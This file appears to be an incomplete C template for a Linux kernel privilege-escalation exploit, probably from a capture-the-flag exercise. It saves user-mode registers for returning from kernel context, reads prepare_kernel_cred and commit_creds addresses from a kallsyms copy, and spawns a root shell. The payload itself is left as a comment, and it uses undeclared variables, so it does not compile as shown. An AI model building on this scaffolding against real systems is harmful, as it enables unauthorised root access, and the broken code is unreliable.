//gcc --static -O0 exp.c -o exp_stack
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <signal.h> 

uint64_t PKC_ADDR=0; 
uint64_t CC_ADDR=0;

void die(char *msg){
    puts(msg);
    exit(-1);
}

typedef struct TrapFrameSt {
    void *rip;
    uint64_t cs;
    uint64_t eflags;
    void *rsp;
    uint64_t ss;
} TrapFrame;

void get_shell(){
    if (getuid() == 0)
        system("/bin/sh");
    else
        die("[get_shell] uid != 0");
}

TrapFrame trap_frame;
void save_status(){
    uint64_t  rsp;
    uint32_t cs, eflags, ss;
    cs = 0;
    asm volatile("movl %%cs, %0;"
        "pushf;"
        "pop %%rax;"
        "movl %%eax, %1;"
        "movq %%rsp, %2;"
        "movl %%ss, %3;"
        : "=r"(cs), "=r"(eflags), "=r"(rsp), "=r"(ss)
        :
        : "rax"
    );
    trap_frame.rip = &get_shell;
    trap_frame.cs = cs;
    trap_frame.eflags = eflags;
    trap_frame.rsp = (void *)rsp;
    trap_frame.ss = ss;
    printf("[save_status]\nrip : %p\ncs:%#x\neflags:%#x\nrsp:%p\nss:%#x\n\n", &get_shell, cs, eflags, rsp, ss);
}

void get_pkc_cc_addr(char *sympath){
    size_t line_size = 0x100;
    char *line = malloc(line_size);
    FILE* symfp = fopen(sympath, "r");
    if (symfp == NULL)
        die("[get_pkc_cc_addr] open kallsyms file failed");
    while((PKC_ADDR == 0) || (CC_ADDR == 0)){
        if(getline(&line, &line_size, symfp) == -1)
            die("[get_pkc_cc_addr] getline error");
        if (strstr(line, " prepare_kernel_cred") != 0){
            if (PKC_ADDR != 0)
                die("[get_pkc_cc_addr] duplicate prepare_kernel_cred symbols");
            PKC_ADDR = strtoull(line, NULL, 16);
            if (PKC_ADDR == 0)
                die("[get_pkc_cc_addr] kallsyms addr is 0");
        } else if(strstr(line, " commit_creds") != 0){
            if (CC_ADDR != 0)
                die("[get_pkc_cc_addr] duplicate commit_creds symbols");
            CC_ADDR = strtoull(line, NULL, 16);
            if (CC_ADDR == 0)
                die("[get_pkc_cc_addr] kallsyms addr is 0");
        }
    }
    printf("[get_pkc_cc_addr]\nprepare_kernel_cred : %llx\ncommit_creds : %llx\n\n", PKC_ADDR, CC_ADDR);
}

int main(){
    signal(SIGSEGV, get_shell);
    get_pkc_cc_addr("/tmp/kallsyms");
    save_status();
    uint64_t gad_offset = (CC_ADDR -  cc_offset) - raw_vmlinux_text_addr;

    //construct the payload...

    return 0;
}